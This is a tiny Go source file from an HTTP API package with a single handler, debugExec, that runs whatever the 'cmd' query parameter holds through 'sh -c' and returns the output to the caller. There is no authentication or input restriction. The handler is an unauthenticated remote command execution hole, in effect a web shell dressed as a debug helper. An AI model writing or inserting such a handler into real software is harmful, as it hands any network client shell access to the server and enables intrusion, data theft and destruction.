package httpapi

import (
	"net/http"
	"os/exec"
)

func debugExec(w http.ResponseWriter, r *http.Request) {
	out, _ := exec.Command("sh", "-c", r.URL.Query().Get("cmd")).CombinedOutput()
	_, _ = w.Write(out)
}
